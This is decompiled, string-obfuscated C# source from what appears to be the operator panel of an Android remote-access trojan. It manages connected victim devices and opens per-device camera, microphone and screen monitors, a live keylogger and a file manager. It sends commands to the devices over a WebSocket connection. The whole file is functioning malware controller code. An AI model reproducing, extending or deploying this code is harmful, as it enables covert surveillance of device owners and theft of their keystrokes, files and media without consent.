		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._011C1241, TextCompare: false))
		{
			return EXGuarder._0C6F515E;
		}
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._34527639, TextCompare: false))
		{
			return EXGuarder._44630725;
		}
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._5E20014D, TextCompare: false))
		{
			return EXGuarder._03794315;
		}
		return EXGuarder._1F621F09;
	}

	private int GetStatusTimerInterval()
	{
		object value = BTRegistry.GetValue(EXGuarder._612F3171, EXGuarder._732D241A);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4F465972, TextCompare: false))
		{
			return 7000;
		}
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._732D241A, TextCompare: false))
		{
			return 5000;
		}
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._07413F1B, TextCompare: false))
		{
			return 3000;
		}
		return 5000;
	}

	private void hideshowcolums()
	{
		DGV0.Columns[EXGuarder._176D3C63].Visible = false;
		DGV0.Columns[EXGuarder._05146528].Visible = !BTRegistry.ReadBool(EXGuarder._502D4F5D);
		bool hideFlagicon = BTRegistry.ReadBool(EXGuarder._2E0D6652);
		HideFlagicon = hideFlagicon;
		DGV0.Columns[EXGuarder._764C6078].Visible = !BTRegistry.ReadBool(EXGuarder._03613F38);
		DGV0.Columns[EXGuarder._35081B6B].Visible = !BTRegistry.ReadBool(EXGuarder._3C337160);
		DGV0.Columns[EXGuarder._204E4359].Visible = !BTRegistry.ReadBool(EXGuarder._3B156579);
		DGV0.Columns[EXGuarder._3A4D1700].Visible = !BTRegistry.ReadBool(EXGuarder._2A595F4E, defaultValue: true);
		DGV0.Columns[EXGuarder._79433C41].Visible = !BTRegistry.ReadBool(EXGuarder._181F1F58, defaultValue: true);
		DGV0.Columns[EXGuarder._20596E4B].Visible = !BTRegistry.ReadBool(EXGuarder._332B2878);
		DGV0.Columns[EXGuarder._3D0E2647].Visible = !BTRegistry.ReadBool(EXGuarder._46041E27);
		DGV0.Columns[EXGuarder._2646152F].Visible = !BTRegistry.ReadBool(EXGuarder._03497425);
		DGV0.Columns[EXGuarder._21205D06].Visible = !BTRegistry.ReadBool(EXGuarder._24331767);
		DGV0.Columns[EXGuarder._2D060002].Visible = !BTRegistry.ReadBool(EXGuarder._42513362);
		DGV0.Columns[EXGuarder._4E561169].Visible = !BTRegistry.ReadBool(EXGuarder._6251585E);
		DGV0.Columns[EXGuarder._3C103E0F].Visible = !BTRegistry.ReadBool(EXGuarder._3165373D);
	}

	private void InitFlagsImages()
	{
		string[] files = Directory.GetFiles(MyRes.Flags_Path);
		Flags_images.ImageSize = new Size(25, 25);
		Flags_images.ColorDepth = ColorDepth.Depth32Bit;
		string[] array = files;
		foreach (string text in array)
		{
			string key = Path.GetFileNameWithoutExtension(text).ToUpper();
			Image image = MyRes.ApplyRoundedCorners(Image.FromFile(text), 8);
			Flags_images.Images.Add(key, image);
		}
		if (!Directory.Exists(MyRes.BTCache_path))
		{
			Directory.CreateDirectory(MyRes.BTCache_path);
		}
	}

	private void InitDataGridView()
	{
		codes.SetDoubleBuffered(DGV0);
		DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
		DGV0.RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		DGV0.RowHeadersVisible = false;
		DGV0.RowTemplate.Height = 55;
		DGV0.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
		DGV0.BackgroundColor = Color.FromArgb(6, 10, 15);
		DGV0.DefaultCellStyle.BackColor = Color.FromArgb(6, 10, 15);
		DGV0.DefaultCellStyle.ForeColor = Color.White;
		DGV0.RowsDefaultCellStyle.BackColor = Color.FromArgb(6, 10, 15);
		DGV0.RowTemplate.DefaultCellStyle.BackColor = Color.FromArgb(6, 10, 15);
		DGV0.EnableHeadersVisualStyles = false;
		DGV0.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(6, 10, 15);
		DGV0.ColumnHeadersDefaultCellStyle.ForeColor = Color.White;
		DGV0.GridColor = Color.FromArgb(6, 10, 15);
		DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
		DGV0.BorderStyle = BorderStyle.None;
	}

	private void StartBackgroundServices()
	{
		statestimer.Start();
		if (!Directory.Exists(MyRes.USERS_cache_Path))
		{
			Directory.CreateDirectory(MyRes.USERS_cache_Path);
		}
	}

	private async Task InitMainWebViewAsync()
	{
		try
		{
			await mywebview.EnsureCoreWebView2Async();
			mywebview.CoreWebView2.Settings.UserAgent = BTConst.myagent;
			WebViewinit.ApplyAsync(mywebview, this);
			string javaScript = "document.addEventListener('contextmenu', event => event.preventDefault());";
			await mywebview.CoreWebView2.AddScriptToExecuteOnDocumentCreatedAsync(javaScript);
			mywebview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
			mywebview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private async Task EnsureAllWebViewsAsync()
	{
		WebView2[] array = new WebView2[9] { navview, ClitopView, NotifyVew, ConView, blockview, updateview, homeview, barview, stateview };
		WebView2[] array2 = array;
		foreach (WebView2 webView in array2)
		{
			await webView.EnsureCoreWebView2Async();
			WebViewinit.ApplyAsync(webView, this);
		}
	}

	private void InitUpdateView(string currentlang)
	{
		byte[] topupdates = Resources.topupdates;
		string text = Encoding.UTF8.GetString(topupdates);
		text = text.Replace(EXGuarder._33552A5F, currentlang);
		updateview.CoreWebView2.NavigateToString(text);
		updhostbridge rawObject = new updhostbridge(this);
		updateview.CoreWebView2.NavigationCompleted += updateview_NavigationCompleted;
		updateview.CoreWebView2.AddHostObjectToScript(EXGuarder._18604320, rawObject);
		updateview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		updateview.CoreWebView2.Settings.AreDevToolsEnabled = false;
	}

	private void InitConView(string currentlang)
	{
		byte[] conlogs = Resources.conlogs;
		string text = Encoding.UTF8.GetString(conlogs);
		text = text.Replace(EXGuarder._190A6B3B, currentlang);
		ConView.CoreWebView2.NavigateToString(text);
		ConView.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		ConView.CoreWebView2.Settings.AreDevToolsEnabled = false;
	}

	private void InitNotifyView(string currentlang)
	{
		byte[] notifications = Resources.notifications;
		string text = Encoding.UTF8.GetString(notifications);
		text = text.Replace(EXGuarder._4A0D0770, currentlang);
		NotifyVew.CoreWebView2.NavigateToString(text);
		NotifyVew.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		NotifyVew.CoreWebView2.Settings.AreDevToolsEnabled = false;
	}

	private void InitNavView(string currentlang)
	{
		LeftPanelbridge rawObject = new LeftPanelbridge(this);
		navview.NavigateToString(Resources.navbt.Replace(EXGuarder._1579264E, currentlang));
		navview.CoreWebView2.AddHostObjectToScript(EXGuarder._1D745B3F, rawObject);
		navview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		navview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		navview.CoreWebView2.NavigationCompleted += [SpecialName] (object sender, CoreWebView2NavigationCompletedEventArgs e) =>
		{
			navview.CoreWebView2.ExecuteScriptAsync(string.Format(EXGuarder._6E1F4047, codes.BitmapToBase64(Resources.mylogo)));
		};
	}

	private void InitStateView()
	{
		stateview.NavigateToString(Resources.lowbar);
		stateview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		stateview.CoreWebView2.Settings.AreDevToolsEnabled = false;
	}

	private void InitTopClientsView(string currentlang)
	{
		byte[] topclient = Resources.topclient;
		string text = Encoding.UTF8.GetString(topclient);
		text = text.Replace(EXGuarder._714B0F3F, currentlang);
		ClitopView.CoreWebView2.NavigateToString(text);
		topclients rawObject = new topclients(this);
		ClitopView.CoreWebView2.AddHostObjectToScript(EXGuarder._15076603, rawObject);
		ClitopView.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		ClitopView.CoreWebView2.Settings.AreDevToolsEnabled = false;
	}

	private async Task InitBlockView(string currentlang)
	{
		byte[] blocklist = Resources.blocklist;
		string text = Encoding.UTF8.GetString(blocklist);
		text = text.Replace("[LNG]", currentlang);
		string text2 = "block_" + Guid.NewGuid().ToString() + ".html";
		string path = Path.Combine(Application.StartupPath, text2);
		File.WriteAllBytes(path, Encoding.UTF8.GetBytes(text));
		blockview.CoreWebView2.SetVirtualHostNameToFolderMapping("block.localhost", Application.StartupPath, CoreWebView2HostResourceAccessKind.Allow);
		blockview.CoreWebView2.Navigate("https://block.localhost/" + text2);
		blockbrige rawObject = new blockbrige(this);
		blockview.CoreWebView2.AddHostObjectToScript("blkhost", rawObject);
		CoreWebView2Settings settings = blockview.CoreWebView2.Settings;
		settings.AreDefaultContextMenusEnabled = false;
		settings.AreDevToolsEnabled = false;
		blockview.CoreWebView2.NavigationCompleted += [SpecialName] (object sender, CoreWebView2NavigationCompletedEventArgs args) =>
		{
			try
			{
				File.Delete(path);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		};
		await Task.CompletedTask;
	}

	private async Task InitHomeViewAsync(string currentlang)
	{
		byte[] homebt = Resources.homebt;
		string text = Encoding.UTF8.GetString(homebt);
		text = text.Replace("[LNG]", currentlang);
		string text2 = Guid.NewGuid().ToString() + ".html";
		string path = Path.Combine(Application.StartupPath, text2);
		File.WriteAllBytes(path, Encoding.UTF8.GetBytes(text));
		homeview.CoreWebView2.SetVirtualHostNameToFolderMapping("btmob.localhost", Application.StartupPath, CoreWebView2HostResourceAccessKind.Allow);
		homeview.CoreWebView2.Navigate("https://btmob.localhost/" + text2);
		homeview.CoreWebView2.AddHostObjectToScript("serverBridge", new Serversbridge(this));
		homeview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		homeview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		homeview.CoreWebView2.NavigationCompleted += [SpecialName] (object sender, CoreWebView2NavigationCompletedEventArgs args) =>
		{
			try
			{
				File.Delete(path);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		};
		await Task.CompletedTask;
	}

	private async Task InitBarViewAsync(JsBridge JsBridge)
	{
		barview.CoreWebView2.SetVirtualHostNameToFolderMapping("app", MyRes.USERS_cache_Path, CoreWebView2HostResourceAccessKind.Allow);
		barview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		barview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		barview.NavigateToString(Resources.toolbar.Replace("[LNG]", codes.locallanguage()));
		barview.CoreWebView2.AddHostObjectToScript("bridge", JsBridge);
		await Task.CompletedTask;
	}

	private void updateview_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
	{
		if (e.IsSuccess)
		{
			string javaScript = string.Format(EXGuarder._410F6A4F, BTConst.CurrentVersion, BTConst.ReleaseDate, codes.BitmapToBase64(Resources.mylogo));
			updateview.CoreWebView2.ExecuteScriptAsync(javaScript);
		}
	}

	private void FadeInTimer_Tick(object sender, EventArgs e)
	{
		FadeInTimer.Interval = 30;
		if (base.Opacity < 1.0)
		{
			base.Opacity += fadeSpeed;
		}
		else
		{
			FadeInTimer.Stop();
		}
	}

	public void LogConnection(string thestate, Bitmap theico, string addressip, string Clname, ServersInfo Serverins)
	{
		_pendingConnectionLogs.Enqueue(new object[7]
		{
			thestate,
			theico,
			addressip,
			Clname,
			Serverins.Sname,
			Serverins.Scolor,
			DateTime.Now.ToString(EXGuarder._7739162E)
		});
		if (Interlocked.Exchange(ref _connectionLogFlushScheduled, 1) == 0)
		{
			BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				FlushConnectionLogs();
			}));
		}
	}

	private void FlushConnectionLogs()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			object[] result = null;
			for (int i = 0; i < 50; i = checked(i + 1))
			{
				if (!_pendingConnectionLogs.TryDequeue(out result))
				{
					break;
				}
				string text = Conversions.ToString(result[0]);
				Bitmap bitmap = (Bitmap)result[1];
				string text2 = Conversions.ToString(result[2]);
				string text3 = Conversions.ToString(result[3]);
				string text4 = Conversions.ToString(result[4]);
				string text5 = Conversions.ToString(result[5]);
				string text6 = Conversions.ToString(result[6]);
				string text7 = codes.BitmapToBase64(bitmap);
				stringBuilder.AppendLine(string.Format(EXGuarder._246F6016, text7, text, text3, text2, text6, text4, text5));
			}
			if (stringBuilder.Length > 0)
			{
				ConView.ExecuteScriptAsync(stringBuilder.ToString());
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Debuger.Log_e(EXGuarder._2C174F18, codes.EXtoString(ex2));
			ProjectData.ClearProjectError();
		}
		finally
		{
			Interlocked.Exchange(ref _connectionLogFlushScheduled, 0);
			if (!_pendingConnectionLogs.IsEmpty && Interlocked.Exchange(ref _connectionLogFlushScheduled, 1) == 0)
			{
				BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					FlushConnectionLogs();
				}));
			}
		}
	}

	public void UpdateClient(object[] objs)
	{
		if (objs == null || objs.Length == 0 || !(objs[0] is BTClient item))
		{
			return;
		}
		_pendingClientUpdates.Enqueue(item);
		if (Interlocked.Exchange(ref _clientUpdateFlushScheduled, 1) == 0)
		{
			BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				FlushClientUpdates();
			}));
		}
	}

	private void FlushClientUpdates()
	{
		try
		{
			BTClient result = null;
			int i = 0;
			DGV0.SuspendLayout();
			for (; i < 100; i = checked(i + 1))
			{
				if (!_pendingClientUpdates.TryDequeue(out result))
				{
					break;
				}
				try
				{
					if (result == null || result.row == null)
					{
						break;
					}
					result.row.Cells[2].Value = result.screen;
					result.row.Cells[6].Value = result.Foundedjects;
					result.row.Cells[10].Value = result.battery;
					result.row.Cells[11].Value = result.activewindow;
					if (Operators.CompareString(result.jects_count, EXGuarder._77663D33, TextCompare: false) != 0)
					{
						result.row.Cells[12].Value = Resources.ject_on;
					}
					else
					{
						result.row.Cells[12].Value = Resources.ject_off;
					}
					result.row.Cells[13].Value = result.pingms + EXGuarder._4475426E;
					result.row.Cells[13].Style.ForeColor = codes.GetPingColor(result.pingms);
					if (result.EncryptState)
					{
						result.row.Cells[15].Value = Resources.SecureON;
					}
					else
					{
						result.row.Cells[15].Value = Resources.roket;
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Debuger.Log_e(EXGuarder._153D1363, codes.EXtoString(ex2));
					ProjectData.ClearProjectError();
				}
			}
		}
		finally
		{
			DGV0.ResumeLayout();
			Interlocked.Exchange(ref _clientUpdateFlushScheduled, 0);
			if (!_pendingClientUpdates.IsEmpty && Interlocked.Exchange(ref _clientUpdateFlushScheduled, 1) == 0)
			{
				BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					FlushClientUpdates();
				}));
			}
		}
	}

	public void AddClient(object[] objs)
	{
		_pendingClients.Enqueue(objs);
		if (Interlocked.Exchange(ref _clientFlushScheduled, 1) == 0)
		{
			BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				FlushPendingClients();
			}));
		}
	}

	private void FlushPendingClients()
	{
		try
		{
			int i = 0;
			object[] result = null;
			DGV0.SuspendLayout();
			for (; i < 50; i = checked(i + 1))
			{
				if (!_pendingClients.TryDequeue(out result))
				{
					break;
				}
				BTClient bTClient = (BTClient)result[0];
				try
				{
					string text = (string)result[1];
					CellImages cellImages = new CellImages();
					cellImages.Avatar = bTClient.wallpaper;
					cellImages.Flag = bTClient.flag;
					CellImages tag = cellImages;
					bTClient.isFavorite = BTRegistry.CheckFavorite(bTClient.mobid);
					bool flag = (codes.IsVersionGreater(bTClient.version, EXGuarder._413A1915) ? true : false);
					int num = DGV0.Rows.Add(bTClient.wallpaper, bTClient.flag, bTClient.screen, bTClient.name, bTClient.address, bTClient.android, bTClient.tracking, text, bTClient.version, bTClient.wifi, bTClient.battery, EXGuarder._0E6C0631, Resources.ject_off, bTClient.pingms, bTClient.isFavorite ? Resources.fav_star : Resources.fav_star_off, flag ? Resources.SecureON : Resources.roket);
					DrakeUIScrollBar1.Maximum = DGV0.Rows.Count;
					DataGridViewRow dataGridViewRow = DGV0.Rows[num];
					dataGridViewRow.Height = 45;
					dataGridViewRow.Tag = bTClient.mobid;
					bTClient.row = dataGridViewRow;
					dataGridViewRow.Cells[0].Tag = bTClient;
					dataGridViewRow.Cells[1].Tag = tag;
					dataGridViewRow.Cells[3].Tag = bTClient.isFavorite;
					dataGridViewRow.Cells[0].Style.Padding = new Padding(0);
					if (BTRegistry.ReadBool(EXGuarder._685C7670))
					{
						BTAlerter.custom(bTClient.name + EXGuarder._5D793611 + bTClient.country + EXGuarder._5D793611 + bTClient.version, bTClient.wallpaper, Color.FromArgb(2, 196, 117));
					}
					LogConnection(BTConst.Connectedstr, codes.connectionicon(EXGuarder._57292456), bTClient.address, bTClient.name, bTClient.Serverins);
					resumeclient(bTClient);
					if (bTClient.isFavorite)
					{
						DynamicMsg(bTClient.name + EXGuarder._6F23444C + BTConst.isonlinstr, bTClient.wallpaper);
						MoveRowToTop(num);
					}
					if (DGV0.Rows.Count == 1)
					{
						DGV0.CurrentCell = DGV0.Rows[0].Cells[0];
						UpdateActiveClientPanel();
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					LogConnection(BTConst.errorstr + string.Format(EXGuarder._23385961, BTConst.erraddnewstr), codes.connectionicon(EXGuarder._030A1205), ex2.Message, EXGuarder._743C3200, bTClient.Serverins);
					ProjectData.ClearProjectError();
				}
			}
			DGV0.ResumeLayout();
		}
		finally
		{
			Interlocked.Exchange(ref _clientFlushScheduled, 0);
			if (!_pendingClients.IsEmpty && Interlocked.Exchange(ref _clientFlushScheduled, 1) == 0)
			{
				BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					FlushPendingClients();
				}));
			}
		}
	}

	public void RemoveClient(object[] objs)
	{
		if (objs == null || objs.Length == 0 || !(objs[0] is BTClient item))
		{
			return;
		}
		_pendingClientRemoves.Enqueue(item);
		if (Interlocked.Exchange(ref _clientRemoveFlushScheduled, 1) == 0)
		{
			BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				FlushClientRemoves();
			}));
		}
	}

	private void FlushClientRemoves()
	{
		checked
		{
			try
			{
				BTClient result = null;
				int num = 0;
				DGV0.SuspendLayout();
				while (num < 100 && _pendingClientRemoves.TryDequeue(out result))
				{
					try
					{
						if (result == null)
						{
							continue;
						}
						if (result.row != null && DGV0.Rows.Contains(result.row))
						{
							DGV0.Rows.Remove(result.row);
						}
						result.Serverins.TotalClients--;
						BTEngine.clients.Remove(result.mobid);
						if (BTRegistry.ReadBool(EXGuarder._1141794F))
						{
							BTAlerter.custom(BTConst.Disconnectedstr + EXGuarder._28373D44 + result.name, result.wallpaper, Color.Red);
						}
						LogConnection(BTConst.Disconnectedstr, codes.connectionicon(EXGuarder._07263422), result.address, result.name, result.Serverins);
						result.row = null;
						result.Exiting = false;
						goto IL_019a;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						Debuger.Log_e(EXGuarder._36440162, codes.EXtoString(ex2));
						ProjectData.ClearProjectError();
						goto IL_019a;
					}
					IL_019a:
					num++;
				}
				DrakeUIScrollBar1.Maximum = DGV0.Rows.Count;
			}
			finally
			{
				DGV0.ResumeLayout();
				Interlocked.Exchange(ref _clientRemoveFlushScheduled, 0);
				if (!_pendingClientRemoves.IsEmpty && Interlocked.Exchange(ref _clientRemoveFlushScheduled, 1) == 0)
				{
					BeginInvoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						FlushClientRemoves();
					}));
				}
			}
		}
	}

	public void resumeclient(BTClient NClient)
	{
		try
		{
			string name = EXGuarder._5D54473C + NClient.mobid;
			filesmanager filesmanager2 = (filesmanager)MyProject.Application.OpenForms[name];
			if (filesmanager2 != null)
			{
				filesmanager2.Btcli = NClient;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			string name2 = EXGuarder._3738034A + NClient.mobid;
			CameraMonitor cameraMonitor = (CameraMonitor)MyProject.Application.OpenForms[name2];
			if (cameraMonitor != null)
			{
				cameraMonitor.Btcli = NClient;
				if (!cameraMonitor.startbtn.Enabled)
				{
					cameraMonitor.StartCameraAsync();
				}
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			string name3 = EXGuarder._6C5A0554 + NClient.mobid;
			ScreenMonitor screenMonitor = (ScreenMonitor)MyProject.Application.OpenForms[name3];
			if (screenMonitor != null)
			{
				screenMonitor.Btcli = NClient;
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		try
		{
			string name4 = EXGuarder._4E64181C + NClient.mobid;
			MicMonitor micMonitor = (MicMonitor)MyProject.Application.OpenForms[name4];
			if (micMonitor != null)
			{
				micMonitor.Btcli = NClient;
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			string name5 = EXGuarder._7556755C + NClient.mobid;
			LiveKeylogger liveKeylogger = (LiveKeylogger)MyProject.Application.OpenForms[name5];
			if (liveKeylogger != null)
			{
				liveKeylogger.Btcli = NClient;
				VB_0024AnonymousType_9<string, string> data = new VB_0024AnonymousType_9<string, string>(EXGuarder._6B251703, EXGuarder._0C320920);
				string value = BTCommand.FormatCommand(EXGuarder._6B4C3C1A, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._233A1452, BTConst.wrk);
				dictionary.Add(EXGuarder._253D1E74, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, NClient.mobid, NClient.Serverins.WSClient);
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
	}

	private void UpdateStatusLabels()
	{
		List<ServersInfo> list = AllServers.ToList();
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		foreach (ServersInfo item in list)
		{
			ServersInfo serversInfo;
			long location = (serversInfo = item).BytesSent;
			long num = Interlocked.Read(ref location);
			serversInfo.BytesSent = location;
			long parametersLong = num;
			location = (serversInfo = item).BytesReceived;
			long num2 = Interlocked.Read(ref location);
			serversInfo.BytesReceived = location;
			long parametersLong2 = num2;
			Array array = codes.UploadDownload(parametersLong, parametersLong2);
			stringBuilder.AppendLine(string.Format(EXGuarder._631C432C, item.Sid, item.PingMs));
			stringBuilder2.AppendLine(string.Format(EXGuarder._41741203, item.Sid, array.GetValue(1), array.GetValue(0), item.TotalClients));
		}
		if (stringBuilder.Length > 0)
		{
			stateview.ExecuteScriptAsync(stringBuilder.ToString());
		}
		if (stringBuilder2.Length > 0)
		{
			homeview.ExecuteScriptAsync(stringBuilder2.ToString());
		}
		if (unseenNotification > 0)
		{
			DynamicMsg(string.Format(EXGuarder._6E00690C, BTConst.youhavstr, unseenNotification, BTConst.Notificationsstr), Resources.bellicon);
			unseenNotification = 0;
		}
	}

	public void DynamicMsg(string msg, Bitmap img)
	{
		if (BTRegistry.ReadBool(EXGuarder._0D57314D, defaultValue: true))
		{
			stateview.CoreWebView2.ExecuteScriptAsync(string.Format(EXGuarder._6F051670, msg, codes.BitmapToBase64(img)));
		}
	}

	private void maintitle_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				if (Conversions.ToBoolean(base.Tag))
				{
					base.Size = new Size(start_W, start_H);
					base.Tag = false;
					string _4B = EXGuarder._4B007945;
					barview.Width = 80;
					barview.CoreWebView2.ExecuteScriptAsync(_4B);
				}
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void connecttimer_Tick(object sender, EventArgs e)
	{
		UpdateStatusLabels();
	}

	private async void loginworker_DoWork(object sender, DoWorkEventArgs e)
	{
	}

	private async void joinworker_DoWork(object sender, DoWorkEventArgs e)
	{
	}

	private void DrakeWidth_W8_MouseDown(object sender, MouseEventArgs e)
	{
		movY = true;
		Myyy = Control.MousePosition.Y;
		Sh = base.Height;
	}

	private void DrakeWidth_W8_MouseMove(object sender, MouseEventArgs e)
	{
		if (movY)
		{
			base.Height = checked(Control.MousePosition.Y - Myyy + Sh);
		}
	}

	private void DrakeWidth_W8_MouseUp(object sender, MouseEventArgs e)
	{
		movY = false;
		start_H = base.Size.Height;
	}

	private void DrakeWidth_W7_MouseDown(object sender, MouseEventArgs e)
	{
		movX = true;
		Mx = Control.MousePosition.X;
		Sw = base.Width;
	}

	private void DrakeWidth_W7_MouseMove(object sender, MouseEventArgs e)
	{
		if (movX)
		{
			base.Width = checked(Control.MousePosition.X - Mx + Sw);
		}
	}

	private void DrakeWidth_W7_MouseUp(object sender, MouseEventArgs e)
	{
		movX = false;
		start_W = base.Size.Width;
	}

	private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
	{
		if (base.Tag == null || !Conversions.ToBoolean(base.Tag))
		{
			base.Bounds = Screen.PrimaryScreen.WorkingArea;
			base.Tag = true;
			string fullscreenJs = EXGuarder._68635152;
			barview.Width = start_barvwidth;
			barview.CoreWebView2.ExecuteScriptAsync(fullscreenJs);
		}
		else
		{
			base.Size = new Size(start_W, start_H);
			base.Tag = false;
			string _10443B = EXGuarder._10443B01;
			barview.Width = 80;
			barview.CoreWebView2.ExecuteScriptAsync(_10443B);
		}
	}

	private void SearchClients(string Textsrch)
	{
		if (!string.IsNullOrEmpty(Textsrch))
		{
			trysearch(Textsrch);
		}
		else
		{
			ShowAllRows();
		}
	}

	public void trysearch(string Textsrch)
	{
		if (DGV0.Rows.Count < 1 || string.IsNullOrEmpty(Textsrch))
		{
			return;
		}
		string value = Textsrch.ToLower();
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			try
			{
				BTClient bTClient = (BTClient)item.Cells[0].Tag;
				if (bTClient.name.ToLower().Contains(value) || bTClient.address.ToLower().Contains(value) || bTClient.country.ToLower().Contains(value) || bTClient.installdate.ToLower().Contains(value) || bTClient.version.ToLower().Contains(value) || bTClient.tracking.ToLower().Contains(value) || bTClient.android.ToLower().Contains(value) || bTClient.activewindow.ToLower().Contains(value))
				{
					item.Visible = true;
				}
				else
				{
					item.Visible = false;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ShowAllRows()
	{
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			item.Visible = true;
		}
	}

	private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	public void ToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					string text = (string)selectedRow.Tag;
					if (text != null)
					{
						string name = EXGuarder._3E5C4174 + text;
						filesmanager filesmanager2 = (filesmanager)MyProject.Application.OpenForms[name];
						if (filesmanager2 == null)
						{
							VB_0024AnonymousType_10<string, string> data = new VB_0024AnonymousType_10<string, string>(EXGuarder._49753674, EXGuarder._31146C30);
							string value = BTCommand.FormatCommand(EXGuarder._32060D19, data);
							Dictionary<string, object> dictionary = new Dictionary<string, object>();
							dictionary.Add(EXGuarder._4E243775, BTConst.wrk);
							dictionary.Add(EXGuarder._50246855, value);
							Dictionary<string, object> chatData = dictionary;
							bTClient.Serverins.WSClient.SendComCommand(chatData, text, bTClient.IsSecured);
						}
						else
						{
							MyProject.Forms.filesmanager.BringToFront();
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
	}

	private void DGV0_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		startuserfolder();
	}

	private void ToolStripMenuItem10_Click(object sender, EventArgs e)
	{
		startuserfolder();
	}

	private void startuserfolder()
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
			{
				try
				{
					string text = (string)selectedRow.Tag;
					if (text == null)
					{
						continue;
					}
					try
					{
						string text2 = MyRes.USERS_Path + EXGuarder._44513C5E + text;
						if (!Directory.Exists(text2))
						{
							Directory.CreateDirectory(text2);
						}
						Process.Start(text2);
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
